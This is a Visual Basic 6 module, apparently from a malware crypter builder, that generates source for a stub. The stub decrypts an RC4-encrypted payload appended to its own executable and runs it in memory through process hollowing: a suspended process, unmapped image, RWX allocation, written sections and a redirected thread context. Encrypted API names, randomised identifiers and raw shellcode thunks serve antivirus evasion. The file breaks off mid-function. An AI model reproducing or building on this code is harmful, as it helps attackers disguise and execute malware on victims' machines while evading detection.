Attribute VB_Name = "mFunctions"
Const X = """"

Public Function ProjectSettings() As String
ProjectSettings = "Type=Exe" & vbCrLf & _
"Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\Windows\system32\stdole2.tlb#OLE Automation" & vbCrLf & _
"Class=" & frmMain.Text2(1).Text & "; " & frmMain.Text2(1).Text & ".cls" & vbCrLf & _
"Module=" & frmMain.Text2(0).Text & "; " & frmMain.Text2(0).Text & ".bas" & vbCrLf & _
"Module=" & frmMain.Text2(5).Text & "; " & frmMain.Text2(5).Text & ".bas" & vbCrLf
ProjectSettings = ProjectSettings & "Form=" & frmMain.Text2(4).Text & ".frm" & vbCrLf & _
"Startup = " & X & "Sub Main" & X & vbCrLf & _
"ExeName32 = " & frmMain.Text2(2).Text & vbCrLf & _
"Name = " & X & "Project1" & X & vbCrLf & _
"CompatibleMode = " & X & "0" & X & vbCrLf & _
"ServerSupportFiles = 0" & vbCrLf & _
"CompilationType = -1" & vbCrLf & _
"OptimizationType = 0" & vbCrLf & _
"FavorPentiumPro(tm) = 0" & vbCrLf & _
"CodeViewDebugInfo = 0" & vbCrLf & _
"NoAliasing = 0" & vbCrLf & _
"BoundsCheck = 0" & vbCrLf & _
"OverflowCheck = 0" & vbCrLf & _
"FlPointCheck = 0" & vbCrLf & _
"FDIVCheck = 0" & vbCrLf & _
"UnroundedFP = 0" & vbCrLf & _
"StartMode = 0" & vbCrLf & _
"Unattended = 0" & vbCrLf & _
"Retained = 0" & vbCrLf & _
"ThreadPerObject = 0" & vbCrLf & _
"MaxNumberOfThreads = 1" & vbCrLf
End Function

Public Function frm() As String
frm = "" & "VERSION 5.00" & vbCrLf & _
"Begin VB.Form " & frmMain.Text2(4).Text & vbCrLf & _
"   ClientHeight = 3180" & vbCrLf & _
"   ClientLeft = 60" & vbCrLf & _
"   ClientTop = 360" & vbCrLf & _
"   ClientWidth = 4680" & vbCrLf & _
"   ScaleHeight = 3180" & vbCrLf & _
"   ScaleWidth = 4680" & vbCrLf & _
"   StartUpPosition = 3    'Windows Default" & vbCrLf & _
"End" & vbCrLf & _
"Attribute VB_Name = " & X & frmMain.Text2(4).Text & X & vbCrLf & _
"Attribute VB_GlobalNameSpace = False" & vbCrLf & _
"Attribute VB_Creatable = False" & vbCrLf & _
"Attribute VB_PredeclaredId = True" & vbCrLf & _
"Attribute VB_Exposed = False" & vbCrLf

End Function

Public Function mMain() As String
mMain = "Sub Main()" & vbCrLf & _
"Dim " & frmMain.Text1(0).Text & "        As New " & frmMain.Text2(1).Text & vbCrLf & _
"Dim " & frmMain.Text1(1).Text & "       As String" & vbCrLf & _
"Dim " & frmMain.Text1(2).Text & "()    As String" & vbCrLf & _
"Dim " & frmMain.Text1(47).Text & "()   As String" & vbCrLf
mMain = mMain & "Open App.Path & " & X & "\" & X & " & App.EXEName & " & frmMain.Text1(19).Text & "(" & X & RC4(".exe", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & " For Binary As #1" & vbCrLf & _
frmMain.Text1(1).Text & " = Space(LOF(1))" & vbCrLf & _
"Get #1, , " & frmMain.Text1(1).Text & vbCrLf & _
"Close #1" & vbCrLf & _
frmMain.Text1(2).Text & "() = Split(" & frmMain.Text1(1).Text & ", " & X & "LKQEOPQWE!" & X & ")" & vbCrLf & _
frmMain.Text1(47).Text & "() = Split(" & frmMain.Text1(1).Text & ", " & X & "KQKK!K" & X & ")" & vbCrLf & _
"If " & frmMain.Text1(47).Text & "(2) = " & X & "1" & X & "Then " & vbCrLf & _
"Call " & frmMain.Text3(6).Text & vbCrLf & _
"End if" & vbCrLf & _
"If " & frmMain.Text1(47).Text & "(3) = " & X & "1" & X & "Then " & vbCrLf & _
"Call " & frmMain.Text3(6).Text & vbCrLf & _
"End if" & vbCrLf & _
"If " & frmMain.Text1(47).Text & "(4) = " & X & "1" & X & "Then " & vbCrLf & _
"Call " & frmMain.Text3(6).Text & vbCrLf & _
"End if" & vbCrLf & _
"If " & frmMain.Text1(47).Text & "(5) = " & X & "1" & X & "Then " & vbCrLf & _
"Call " & frmMain.Text3(6).Text & vbCrLf & _
"End if" & vbCrLf & _
frmMain.Text1(2).Text & "(1) = " & frmMain.Text1(19).Text & "(" & frmMain.Text1(2).Text & "(1), Split(" & frmMain.Text1(1).Text & ", " & X & "KQKK!K" & X & ")(1))" & vbCrLf & _
frmMain.Text1(0).Text & "." & frmMain.Text3(0).Text & " StrConv(" & frmMain.Text1(2).Text & "(1), vbFromUnicode), App.Path & " & X & "\" & X & " & App.EXEName & " & frmMain.Text1(19).Text & "(" & X & RC4(".exe", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & vbCrLf & _
"End Sub" & vbCrLf & vbNewLine
End Function




Public Function ntPE() As String
ntPE = "VERSION 1.0 CLASS" & vbCrLf & _
"BEGIN" & vbCrLf & _
"  MultiUse = -1  'True" & vbCrLf & _
"  Persistable = 0  'NotPersistable" & vbCrLf & _
"  DataBindingBehavior = 0  'vbNone" & vbCrLf & _
"  DataSourceBehavior = 0   'vbNone" & vbCrLf & _
"  MTSTransactionMode = 0   'NotAnMTSObject" & vbCrLf & _
"End" & vbCrLf & _
"Attribute VB_GlobalNameSpace = False" & vbCrLf & _
"Attribute VB_Creatable = True" & vbCrLf & _
"Attribute VB_PredeclaredId = False" & vbCrLf & _
"Attribute VB_Exposed = False" & vbCrLf
ntPE = ntPE & "Option Explicit" & vbCrLf & _
"Private Const IMAGE_DOS_SIGNATURE       As Long = &H5A4D&" & vbCrLf & _
"Private Const IMAGE_NT_SIGNATURE        As Long = &H4550&" & vbCrLf & _
"Private Const SIZE_DOS_HEADER           As Long = &H40" & vbCrLf & _
"Private Const SIZE_NT_HEADERS           As Long = &HF8" & vbCrLf & _
"Private Const SIZE_EXPORT_DIRECTORY     As Long = &H28" & vbCrLf & _
"Private Const SIZE_IMAGE_SECTION_HEADER As Long = &H28" & vbCrLf & _
"Dim THUNK_APICALL             As String " & vbCrLf & _
"Dim THUNK_KERNELBASE          As String " & vbCrLf & _
"Private Const PATCH1                    As String = " & X & RC4("<PATCH1>", frmMain.Text1(24).Text) & X & vbCrLf & _
"Private Const PATCH2                    As String = " & X & RC4("<PATCH2>", frmMain.Text1(24).Text) & X & vbCrLf & _
"Private Const CONTEXT_FULL              As Long = &H10007" & vbCrLf & _
"Private Const CREATE_SUSPENDED          As Long = &H4" & vbCrLf & _
"Private Const MEM_COMMIT                As Long = &H1000" & vbCrLf & _
"Private Const MEM_RESERVE               As Long = &H2000" & vbCrLf & _
"Private Const PAGE_EXECUTE_READWRITE    As Long = &H40" & vbCrLf
ntPE = ntPE & "Private Type STARTUPINFO" & vbCrLf & _
"    cb                          As Long" & vbCrLf & _
"    lpReserved                  As Long" & vbCrLf & _
"    lpDesktop                   As Long" & vbCrLf & _
"    lpTitle                     As Long" & vbCrLf & _
"    dwX                         As Long" & vbCrLf & _
"    dwY                         As Long" & vbCrLf & _
"    dwXSize                     As Long" & vbCrLf & _
"    dwYSize                     As Long" & vbCrLf & _
"    dwXCountChars               As Long" & vbCrLf & _
"    dwYCountChars               As Long" & vbCrLf & _
"    dwFillAttribute             As Long" & vbCrLf & _
"    dwFlags                     As Long" & vbCrLf & _
"    wShowWindow                 As Integer" & vbCrLf & _
"    cbReserved2                 As Integer" & vbCrLf & _
"    lpReserved2                 As Long" & vbCrLf & _
"    hStdInput                   As Long" & vbCrLf & _
"    hStdOutput                  As Long" & vbCrLf & _
"    hStdError                   As Long" & vbCrLf & _
"End Type" & vbCrLf
ntPE = ntPE & "Private Type PROCESS_INFORMATION" & vbCrLf & _
"    hProcess                    As Long" & vbCrLf & _
"    hThread                     As Long" & vbCrLf & _
"    dwProcessID                 As Long" & vbCrLf & _
"    dwThreadID                  As Long" & vbCrLf & _
"End Type" & vbCrLf & _
"Private Type FLOATING_SAVE_AREA" & vbCrLf & _
"    ControlWord                 As Long" & vbCrLf & _
"    StatusWord                  As Long" & vbCrLf & _
"    TagWord                     As Long" & vbCrLf & _
"    ErrorOffset                 As Long" & vbCrLf & _
"    ErrorSelector               As Long" & vbCrLf & _
"    DataOffset                  As Long" & vbCrLf & _
"    DataSelector                As Long" & vbCrLf & _
"    RegisterArea(1 To 80)       As Byte" & vbCrLf & _
"    Cr0NpxState                 As Long" & vbCrLf & _
"End Type" & vbCrLf
ntPE = ntPE & "Private Type CONTEXT" & vbCrLf & _
"    ContextFlags                As Long" & vbCrLf & _
"    Dr0                         As Long" & vbCrLf & _
"    Dr1                         As Long" & vbCrLf & _
"    Dr2                         As Long" & vbCrLf & _
"    Dr3                         As Long" & vbCrLf & _
"    Dr6                         As Long" & vbCrLf & _
"    Dr7                         As Long" & vbCrLf & _
"    FloatSave                   As FLOATING_SAVE_AREA" & vbCrLf & _
"    SegGs                       As Long" & vbCrLf & _
"    SegFs                       As Long" & vbCrLf & _
"    SegEs                       As Long" & vbCrLf & _
"    SegDs                       As Long" & vbCrLf & _
"    Edi                         As Long" & vbCrLf & _
"    Esi                         As Long" & vbCrLf & _
"    Ebx                         As Long" & vbCrLf & _
"    Edx                         As Long" & vbCrLf & _
"    Ecx                         As Long" & vbCrLf & _
"    Eax                         As Long" & vbCrLf & _
"    Ebp                         As Long" & vbCrLf & _
"    Eip                         As Long" & vbCrLf & _
"    SegCs                       As Long" & vbCrLf & _
"    EFlags                      As Long" & vbCrLf & _
"    Esp                         As Long" & vbCrLf & _
"    SegSs                       As Long" & vbCrLf
ntPE = ntPE & "End Type" & vbCrLf
ntPE = ntPE & "Private Type IMAGE_DOS_HEADER" & vbCrLf & _
"    e_magic                     As Integer" & vbCrLf & _
"    e_cblp                      As Integer" & vbCrLf & _
"    e_cp                        As Integer" & vbCrLf & _
"    e_crlc                      As Integer" & vbCrLf & _
"    e_cparhdr                   As Integer" & vbCrLf & _
"    e_minalloc                  As Integer" & vbCrLf & _
"    e_maxalloc                  As Integer" & vbCrLf & _
"    e_ss                        As Integer" & vbCrLf & _
"    e_sp                        As Integer" & vbCrLf & _
"    e_csum                      As Integer" & vbCrLf & _
"    e_ip                        As Integer" & vbCrLf & _
"    e_cs                        As Integer" & vbCrLf & _
"    e_lfarlc                    As Integer" & vbCrLf & _
"    e_ovno                      As Integer" & vbCrLf & _
"    e_res(0 To 3)               As Integer" & vbCrLf & _
"    e_oemid                     As Integer" & vbCrLf & _
"    e_oeminfo                   As Integer" & vbCrLf & _
"    e_res2(0 To 9)              As Integer" & vbCrLf & _
"    e_lfanew                    As Long" & vbCrLf & _
"End Type" & vbCrLf
ntPE = ntPE & "Private Type IMAGE_FILE_HEADER" & vbCrLf & _
"    Machine                     As Integer" & vbCrLf & _
"    NumberOfSections            As Integer" & vbCrLf & _
"    TimeDateStamp               As Long" & vbCrLf & _
"    PointerToSymbolTable        As Long" & vbCrLf & _
"    NumberOfSymbols             As Long" & vbCrLf & _
"    SizeOfOptionalHeader        As Integer" & vbCrLf & _
"    Characteristics             As Integer" & vbCrLf & _
"End Type" & vbCrLf & _
"Private Type IMAGE_DATA_DIRECTORY" & vbCrLf & _
"    VirtualAddress              As Long" & vbCrLf & _
"    Size                        As Long" & vbCrLf & _
"End Type" & vbCrLf
ntPE = ntPE & "Private Type IMAGE_OPTIONAL_HEADER" & vbCrLf & _
"    Magic                       As Integer" & vbCrLf & _
"    MajorLinkerVersion          As Byte" & vbCrLf & _
"    MinorLinkerVersion          As Byte" & vbCrLf & _
"    SizeOfCode                  As Long" & vbCrLf & _
"    SizeOfInitializedData       As Long" & vbCrLf & _
"    SizeOfUnitializedData       As Long" & vbCrLf & _
"    AddressOfEntryPoint         As Long" & vbCrLf & _
"    BaseOfCode                  As Long" & vbCrLf & _
"    BaseOfData                  As Long" & vbCrLf & _
"    ImageBase                   As Long" & vbCrLf & _
"    SectionAlignment            As Long" & vbCrLf & _
"    FileAlignment               As Long" & vbCrLf & _
"    MajorOperatingSystemVersion As Integer" & vbCrLf & _
"    MinorOperatingSystemVersion As Integer" & vbCrLf & _
"    MajorImageVersion           As Integer" & vbCrLf & _
"    MinorImageVersion           As Integer" & vbCrLf & _
"    MajorSubsystemVersion       As Integer" & vbCrLf & _
"    MinorSubsystemVersion       As Integer" & vbCrLf & _
"    W32VersionValue             As Long" & vbCrLf & _
"    SizeOfImage                 As Long" & vbCrLf & _
"    SizeOfHeaders               As Long" & vbCrLf & _
"    CheckSum                    As Long" & vbCrLf & _
"    SubSystem                   As Integer" & vbCrLf & _
"    DllCharacteristics          As Integer" & vbCrLf
ntPE = ntPE & "    SizeOfStackReserve          As Long" & vbCrLf & _
"    SizeOfStackCommit           As Long" & vbCrLf & _
"    SizeOfHeapReserve           As Long" & vbCrLf & _
"    SizeOfHeapCommit            As Long" & vbCrLf & _
"    LoaderFlags                 As Long" & vbCrLf & _
"    NumberOfRvaAndSizes         As Long" & vbCrLf & _
"    DataDirectory(0 To 15)      As IMAGE_DATA_DIRECTORY" & vbCrLf & _
"End Type" & vbCrLf & _
"Private Type IMAGE_NT_HEADERS" & vbCrLf & _
"    Signature                   As Long" & vbCrLf & _
"    FileHeader                  As IMAGE_FILE_HEADER" & vbCrLf & _
"    OptionalHeader              As IMAGE_OPTIONAL_HEADER" & vbCrLf & _
"End Type" & vbCrLf
ntPE = ntPE & "Private Type IMAGE_EXPORT_DIRECTORY" & vbCrLf & _
"   Characteristics              As Long" & vbCrLf & _
"   TimeDateStamp                As Long" & vbCrLf & _
"   MajorVersion                 As Integer" & vbCrLf & _
"   MinorVersion                 As Integer" & vbCrLf & _
"   lpName                       As Long" & vbCrLf & _
"   Base                         As Long" & vbCrLf & _
"   NumberOfFunctions            As Long" & vbCrLf & _
"   NumberOfNames                As Long" & vbCrLf & _
"   lpAddressOfFunctions         As Long" & vbCrLf & _
"   lpAddressOfNames             As Long" & vbCrLf & _
"   lpAddressOfNameOrdinals      As Long" & vbCrLf & _
"End Type" & vbCrLf
ntPE = ntPE & "Private Type IMAGE_SECTION_HEADER" & vbCrLf & _
"    SecName                     As String * 8" & vbCrLf & _
"    VirtualSize                 As Long" & vbCrLf & _
"    VirtualAddress              As Long" & vbCrLf & _
"    SizeOfRawData               As Long" & vbCrLf & _
"    PointerToRawData            As Long" & vbCrLf & _
"    PointerToRelocations        As Long" & vbCrLf & _
"    PointerToLinenumbers        As Long" & vbCrLf & _
"    NumberOfRelocations         As Integer" & vbCrLf & _
"    NumberOfLinenumbers         As Integer" & vbCrLf & _
"    Characteristics             As Long" & vbCrLf & _
"End Type" & vbCrLf & _
"Private Declare Sub CopyBytes Lib " & X & "MSVBVM60.DLL" & X & " Alias " & X & "__vbaCopyBytes" & X & " (ByVal Size As Long, Dest As Any, Source As Any)" & vbCrLf & _
"Private " & frmMain.Text1(3).Text & "         As Long" & vbCrLf & _
"Private " & frmMain.Text1(4).Text & "      As Long" & vbCrLf & _
"Private " & frmMain.Text1(5).Text & "         As Boolean" & vbCrLf & _
"Private " & frmMain.Text1(6).Text & "          As Long" & vbCrLf & _
"Private " & frmMain.Text1(7).Text & "       As Long" & vbCrLf & _
"Private " & frmMain.Text1(8).Text & "(&HFF)   As Byte" & vbCrLf & _
"Public Function " & frmMain.Text1(31).Text & "() As Long" & vbCrLf & _
"End Function" & vbCrLf
ntPE = ntPE & "Public Function " & frmMain.Text3(0).Text & "(ByRef " & frmMain.Text1(28).Text & "() As Byte, Optional " & frmMain.Text1(26).Text & " As String, Optional ByRef " & frmMain.Text1(27).Text & " As Long) As Boolean" & vbCrLf & _
"    Dim i                       As Long" & vbCrLf & _
"    Dim " & frmMain.Text1(13).Text & "       As IMAGE_DOS_HEADER" & vbCrLf & _
"    Dim " & frmMain.Text1(14).Text & "       As IMAGE_NT_HEADERS" & vbCrLf & _
"    Dim " & frmMain.Text1(15).Text & "   As IMAGE_SECTION_HEADER" & vbCrLf & _
"    Dim " & frmMain.Text1(16).Text & "            As STARTUPINFO" & vbCrLf & _
"    Dim " & frmMain.Text1(17).Text & "    As PROCESS_INFORMATION" & vbCrLf & _
"    Dim " & frmMain.Text1(18).Text & "                As CONTEXT" & vbCrLf & _
"    Dim " & frmMain.Text1(10).Text & "                 As Long" & vbCrLf & _
"    Dim " & frmMain.Text1(11).Text & "                  As Long" & vbCrLf & _
"    Dim " & frmMain.Text1(12).Text & "                    As Long" & vbCrLf & _
"    If Not " & frmMain.Text1(5).Text & " Then Exit Function" & vbCrLf & _
"    Call CopyBytes(SIZE_DOS_HEADER, " & frmMain.Text1(13).Text & ", " & frmMain.Text1(28).Text & "(0))" & vbCrLf & _
"    If Not " & frmMain.Text1(13).Text & ".e_magic = IMAGE_DOS_SIGNATURE Then" & vbCrLf & _
"        Exit Function" & vbCrLf & _
"    End If" & vbCrLf & _
"    Call CopyBytes(SIZE_NT_HEADERS, " & frmMain.Text1(14).Text & ", " & frmMain.Text1(28).Text & "(" & frmMain.Text1(13).Text & ".e_lfanew))" & vbCrLf & _
"    If Not " & frmMain.Text1(14).Text & ".Signature = IMAGE_NT_SIGNATURE Then" & vbCrLf & _
"        Exit Function" & vbCrLf & _
"    End If" & vbCrLf & _
"    " & frmMain.Text1(10).Text & " = " & frmMain.Text3(5).Text & "(" & frmMain.Text1(19).Text & "(" & X & RC4("kernel32", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & "))" & vbCrLf & _
"    " & frmMain.Text1(11).Text & " = " & frmMain.Text3(5).Text & "(" & frmMain.Text1(19).Text & "(" & X & RC4("ntdll", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & "))" & vbCrLf & _
"    If " & frmMain.Text1(26).Text & " = vbNullString Then" & vbCrLf & _
"        " & frmMain.Text1(26).Text & " = Space(260)" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(10).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("GetModuleFileNameW", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf
ntPE = ntPE & "        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", App.hInstance, StrPtr(" & frmMain.Text1(26).Text & "), 260" & vbCrLf & _
"    End If" & vbCrLf & _
"    With " & frmMain.Text1(14).Text & ".OptionalHeader" & vbCrLf & _
"        " & frmMain.Text1(16).Text & ".cb = Len(" & frmMain.Text1(16).Text & ")" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(10).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("CreateProcessW", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", 0, StrPtr(" & frmMain.Text1(26).Text & "), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(" & frmMain.Text1(16).Text & "), VarPtr(" & frmMain.Text1(17).Text & ")" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(11).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("NtUnmapViewOfSection", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hProcess, .ImageBase" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(10).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("VirtualAllocEx", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hProcess, .ImageBase, .SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(11).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("NtWriteVirtualMemory", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hProcess, .ImageBase, VarPtr(" & frmMain.Text1(28).Text & "(0)), .SizeOfHeaders, 0" & vbCrLf & _
"        For i = 0 To " & frmMain.Text1(14).Text & ".FileHeader.NumberOfSections - 1" & vbCrLf & _
"            CopyBytes Len(" & frmMain.Text1(15).Text & "), " & frmMain.Text1(15).Text & ", " & frmMain.Text1(28).Text & "(" & frmMain.Text1(13).Text & ".e_lfanew + SIZE_NT_HEADERS + SIZE_IMAGE_SECTION_HEADER * i)" & vbCrLf & _
"            " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hProcess, .ImageBase + " & frmMain.Text1(15).Text & ".VirtualAddress, VarPtr(" & frmMain.Text1(28).Text & "(" & frmMain.Text1(15).Text & ".PointerToRawData)), " & frmMain.Text1(15).Text & ".SizeOfRawData, 0" & vbCrLf & _
"        Next i" & vbCrLf & _
"        " & frmMain.Text1(18).Text & ".ContextFlags = CONTEXT_FULL" & vbCrLf & _
"       " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(11).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("NtGetContextThread", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hThread, VarPtr(" & frmMain.Text1(18).Text & ")" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(11).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("NtWriteVirtualMemory", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hProcess, " & frmMain.Text1(18).Text & ".Ebx + 8, VarPtr(.ImageBase), 4, 0" & vbCrLf & _
"        " & frmMain.Text1(18).Text & ".Eax = .ImageBase + .AddressOfEntryPoint" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(11).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("NtSetContextThread", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        " & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hThread, VarPtr(" & frmMain.Text1(18).Text & ")" & vbCrLf & _
"        " & frmMain.Text1(12).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(11).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("NtResumeThread", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf
ntPE = ntPE & frmMain.Text3(1).Text & " " & frmMain.Text1(12).Text & ", " & frmMain.Text1(17).Text & ".hThread, 0" & vbCrLf & _
"        " & frmMain.Text1(27).Text & " = " & frmMain.Text1(17).Text & ".hProcess" & vbCrLf & _
"    End With" & vbCrLf & _
"    " & frmMain.Text3(0).Text & " = True" & vbCrLf & _
"End Function" & vbCrLf
ntPE = ntPE & "Public Function " & frmMain.Text3(1).Text & "(ByVal " & frmMain.Text1(12).Text & " As Long, ParamArray " & frmMain.Text1(32).Text & "()) As Long" & vbCrLf
ntPE = ntPE & "    Dim lPtr        As Long" & vbCrLf & _
"    Dim i           As Long" & vbCrLf & _
"    Dim " & frmMain.Text1(1).Text & "       As String" & vbCrLf & _
"    Dim sParams     As String" & vbCrLf & _
"    THUNK_APICALL = " & frmMain.Text1(19).Text & "(" & X & RC4("8B4C240851<PATCH1>E8<PATCH2>5989016631C0C3", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & vbCrLf & _
"    If " & frmMain.Text1(12).Text & " = 0 Then Exit Function" & vbCrLf & _
"    For i = UBound(" & frmMain.Text1(32).Text & ") To 0 Step -1" & vbCrLf & _
"        sParams = sParams & " & X & "68" & X & " & GetLong(CLng(" & frmMain.Text1(32).Text & "(i)))" & vbCrLf & _
"    Next" & vbCrLf & _
"    lPtr = VarPtr(" & frmMain.Text1(8).Text & "(0))" & vbCrLf & _
"    lPtr = lPtr + (UBound(" & frmMain.Text1(32).Text & ") + 2) * 5" & vbCrLf & _
"    lPtr = " & frmMain.Text1(12).Text & " - lPtr - 5" & vbCrLf & _
"    " & frmMain.Text1(1).Text & " = THUNK_APICALL" & vbCrLf & _
"    " & frmMain.Text1(1).Text & " = Replace(" & frmMain.Text1(1).Text & ", " & frmMain.Text1(19).Text & "(" & "PATCH1" & "," & X & frmMain.Text1(24).Text & X & ")" & ", sParams)" & vbCrLf & _
"    " & frmMain.Text1(1).Text & " = Replace(" & frmMain.Text1(1).Text & ", " & frmMain.Text1(19).Text & "(" & "PATCH2" & "," & X & frmMain.Text1(24).Text & X & ")" & ", GetLong(lPtr))" & vbCrLf & _
"    Call PutThunk(" & frmMain.Text1(1).Text & ")" & vbCrLf & _
"    " & frmMain.Text3(1).Text & " = " & frmMain.Text3(2).Text & vbCrLf & _
"End Function" & vbCrLf & _
"Private Function GetLong(ByVal lData As Long) As String" & vbCrLf & _
"    Dim bvTemp(3)   As Byte" & vbCrLf & _
"    Dim i           As Long" & vbCrLf & _
"    CopyBytes &H4, bvTemp(0), lData" & vbCrLf & _
"    For i = 0 To 3" & vbCrLf & _
"        GetLong = GetLong & Right(" & X & "0" & X & " & Hex(bvTemp(i)), 2)" & vbCrLf & _
"    Next" & vbCrLf
ntPE = ntPE & "End Function" & vbCrLf & _
"Private Sub PutThunk(ByVal sThunk As String)" & vbCrLf & _
"    Dim i   As Long" & vbCrLf & _
"    For i = 0 To Len(sThunk) - 1 Step 2" & vbCrLf & _
"       " & frmMain.Text1(8).Text & "((i / 2)) = CByte(" & X & "&h" & X & " & Mid$(sThunk, i + 1, 2))" & vbCrLf & _
"    Next i" & vbCrLf & _
"End Sub" & vbCrLf & _
"Private Function " & frmMain.Text3(2).Text & "() As Long" & vbCrLf & _
"    CopyBytes &H4, " & frmMain.Text1(6).Text & ", ByVal ObjPtr(Me)" & vbCrLf & _
"    " & frmMain.Text1(6).Text & " = " & frmMain.Text1(6).Text & " + &H1C" & vbCrLf & _
"    CopyBytes &H4, " & frmMain.Text1(7).Text & ", ByVal " & frmMain.Text1(6).Text & "" & vbCrLf & _
"    CopyBytes &H4, ByVal " & frmMain.Text1(6).Text & ", VarPtr(" & frmMain.Text1(8).Text & "(0))" & vbCrLf & _
"    " & frmMain.Text3(2).Text & " = " & frmMain.Text1(31).Text & "" & vbCrLf & _
"    CopyBytes &H4, ByVal " & frmMain.Text1(6).Text & ", " & frmMain.Text1(7).Text & "" & vbCrLf & _
"End Function" & vbCrLf & _
"Public Function " & frmMain.Text1(29).Text & "(ByVal " & frmMain.Text1(25).Text & " As String, ByVal " & frmMain.Text1(30).Text & " As String) As Long" & vbCrLf & _
"    " & frmMain.Text1(29).Text & " = Me." & frmMain.Text3(3).Text & "(Me." & frmMain.Text3(5).Text & "(" & frmMain.Text1(25).Text & "), " & frmMain.Text1(30).Text & ")" & vbCrLf & _
"End Function" & vbCrLf & _
"Public Function " & frmMain.Text3(5).Text & "(ByVal " & frmMain.Text1(25).Text & " As String) As Long" & vbCrLf & _
"    " & frmMain.Text3(5).Text & " = " & frmMain.Text3(1).Text & "(" & frmMain.Text1(4).Text & ", StrPtr(" & frmMain.Text1(25).Text & " & vbNullChar))" & vbCrLf & _
"End Function" & vbCrLf & _
"Public Property Get Initialized() As Boolean" & vbCrLf & _
"    Initialized = " & frmMain.Text1(5).Text & "" & vbCrLf & _
"End Property" & vbCrLf
ntPE = ntPE & "Public Sub Class_Initialize()" & vbCrLf & _
" THUNK_KERNELBASE  = " & frmMain.Text1(19).Text & "(" & X & RC4("8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & vbCrLf & _
"    Call PutThunk(THUNK_KERNELBASE)" & vbCrLf & _
"    " & frmMain.Text1(3).Text & " = " & frmMain.Text3(2).Text & vbCrLf & _
"       If Not " & frmMain.Text1(3).Text & " = 0 Then" & vbCrLf & _
"       " & frmMain.Text1(4).Text & " = " & frmMain.Text3(3).Text & "(" & frmMain.Text1(3).Text & ", " & frmMain.Text1(19).Text & "(" & X & RC4("LoadLibraryW", frmMain.Text1(24).Text) & X & "," & X & frmMain.Text1(24).Text & X & ")" & ")" & vbCrLf & _
"        If Not " & frmMain.Text1(4).Text & " = 0 Then" & vbCrLf & _
"            " & frmMain.Text1(5).Text & " = True" & vbCrLf & _
"        End If" & vbCrLf & _
"    End If" & vbCrLf & _
"End Sub" & vbCrLf
ntPE = ntPE & "Public Function " & frmMain.Text3(3).Text & "(ByVal " & frmMain.Text1(12).Text & " As Long, ByVal " & frmMain.Text1(30).Text & " As String) As Long" & vbCrLf & _
"    Dim " & frmMain.Text1(13).Text & "       As IMAGE_DOS_HEADER" & vbCrLf & _
"    Dim " & frmMain.Text1(14).Text & "       As IMAGE_NT_HEADERS" & vbCrLf & _
